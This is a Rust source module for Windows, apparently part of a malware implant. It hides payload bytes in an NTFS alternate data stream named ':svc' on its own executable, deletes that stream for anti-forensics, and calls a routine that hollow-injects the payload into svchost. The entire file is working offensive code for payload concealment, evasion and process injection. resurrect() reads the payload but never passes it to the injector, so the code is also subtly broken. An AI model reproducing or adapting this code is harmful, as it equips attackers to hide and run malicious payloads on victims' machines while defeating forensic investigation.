//! resurrect.rs — ADS (Alternate Data Stream) drop + cleanup
//!
//! drop_to_ads(data)    — write payload bytes into an NTFS ADS on the current exe
//! drop_from_ads()      — delete the ADS fork (cleanup / anti-forensics)
//! resurrect()          — read ADS back and execute it in a hollow process

#![allow(dead_code, non_snake_case)]

use winapi::um::fileapi::{
    CreateFileW, WriteFile, ReadFile, DeleteFileW,
    CREATE_ALWAYS, OPEN_EXISTING,
};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE, FILE_SHARE_READ};
use winapi::shared::minwindef::DWORD;

/// ADS stream name appended to our own exe path: "exe_path:svc"
const ADS_SUFFIX: &[u16] = &[
    b':' as u16, b's' as u16, b'v' as u16, b'c' as u16, 0u16,
];

unsafe fn own_exe_wide() -> Vec<u16> {
    use winapi::um::libloaderapi::GetModuleFileNameW;
    let mut buf = vec![0u16; 512];
    let len = GetModuleFileNameW(
        core::ptr::null_mut(), buf.as_mut_ptr(), buf.len() as DWORD,
    );
    buf.truncate(len as usize); // strip existing null
    buf
}

/// Build "<exe_path>:svc\0" wide string.
unsafe fn ads_path() -> Vec<u16> {
    let mut base = own_exe_wide();
    base.extend_from_slice(ADS_SUFFIX);
    base
}

/// Write `data` into the ADS stream. Creates it if not present.
pub unsafe fn drop_to_ads(data: &[u8]) -> bool {
    let path = ads_path();
    let h = CreateFileW(
        path.as_ptr(),
        GENERIC_WRITE,
        0,
        core::ptr::null_mut(),
        CREATE_ALWAYS,
        0,
        core::ptr::null_mut(),
    );
    if h == INVALID_HANDLE_VALUE { return false; }
    let mut written: DWORD = 0;
    let ok = WriteFile(
        h,
        data.as_ptr() as *const _,
        data.len() as DWORD,
        &mut written,
        core::ptr::null_mut(),
    ) != 0;
    CloseHandle(h);
    ok && written == data.len() as DWORD
}

/// Delete the ADS stream (removes the fork; exe itself is untouched).
/// Called by guardian cleanup path and after a successful resurrect.
pub unsafe fn drop_from_ads() {
    let path = ads_path();
    // DeleteFileW on an ADS path removes only the stream, not the base file.
    DeleteFileW(path.as_ptr());
}

/// Read the ADS back into a Vec<u8>.
unsafe fn read_ads() -> Option<Vec<u8>> {
    let path = ads_path();
    let h = CreateFileW(
        path.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ,
        core::ptr::null_mut(),
        OPEN_EXISTING,
        0,
        core::ptr::null_mut(),
    );
    if h == INVALID_HANDLE_VALUE { return None; }

    // Get size
    let mut size_hi: DWORD = 0;
    let size_lo = winapi::um::fileapi::GetFileSize(h, &mut size_hi);
    if size_lo == winapi::um::fileapi::INVALID_FILE_SIZE {
        CloseHandle(h);
        return None;
    }
    let total = ((size_hi as usize) << 32) | (size_lo as usize);
    let mut buf = vec![0u8; total];
    let mut read: DWORD = 0;
    let ok = ReadFile(
        h,
        buf.as_mut_ptr() as *mut _,
        total as DWORD,
        &mut read,
        core::ptr::null_mut(),
    ) != 0;
    CloseHandle(h);
    if ok && read as usize == total { Some(buf) } else { None }
}

/// Read the ADS payload and hollow-inject it into a sacrificial process.
/// Cleans up the ADS stream on success.
pub unsafe fn resurrect() -> bool {
    let payload = match read_ads() {
        Some(p) => p,
        None    => return false,
    };
    let ok = crate::hollow::inject_svchost();
    if ok { drop_from_ads(); }
    ok
}
